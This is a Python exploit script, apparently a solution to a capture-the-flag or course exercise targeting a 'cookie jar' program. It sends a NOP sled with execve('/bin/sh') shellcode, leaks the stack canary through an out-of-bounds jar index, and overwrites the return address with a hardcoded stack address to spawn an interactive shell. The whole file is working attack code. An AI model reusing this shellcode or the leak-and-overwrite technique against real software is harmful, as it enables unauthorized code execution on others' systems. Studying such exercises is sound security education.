import interact
import struct

# Pack integer 'n' into an 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

p = interact.Process()

# 1. Send your NOP sled and Shellcode
p.readuntil('name?')
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
p.sendline(b"\x90" * 64 + shellcode)

# 2. Leak the cookie from jar 9
p.readuntil('Which cookie jar do you want to use, 0-7? (-1 to finish)')
p.sendline('9')
p.readuntil('[eat/store]:')
p.sendline('eat')

# 3. Capture and parse the leaked cookie
# Read the output until the next jar prompt appears
output = p.readuntil('Which cookie jar') 
output_str = output.decode('utf-8')

# The output string contains "Yummy cookie 80d051428117a500"
# We split the string to isolate just the hex value
cookie_hex = output_str.split('Yummy cookie ')[1].split()[0]
print(f"[+] Successfully captured cookie: {cookie_hex}")
p.readuntil('do you want to use, 0-7? (-1 to finish)')

# 4. Overwrite the return address (jar 11) with the address of your NOP sled
#wait for a p.readuntil('Which cookie jar do you want to use, 0-7? (-1 to finish)')'
p.sendline('11') # We are already at the prompt from the readuntil above
p.readuntil('[eat/store]:')
p.sendline('store')
p.readuntil('Enter the cookie you want to store (in hex)!') 
p.sendline('0x7fffffffed40') # The start of your buffer

# 5. Exit the cookie loop
p.readuntil('Which cookie jar do you want to use, 0-7? (-1 to finish)')
p.sendline('-1')

# 6. Provide the master cookie to pass the final check
p.readuntil('Did you find the cookie? Tell me what it was!! (In hex)') # Adjust this string if the exact prompt differs
p.sendline(cookie_hex)


p.interactive()
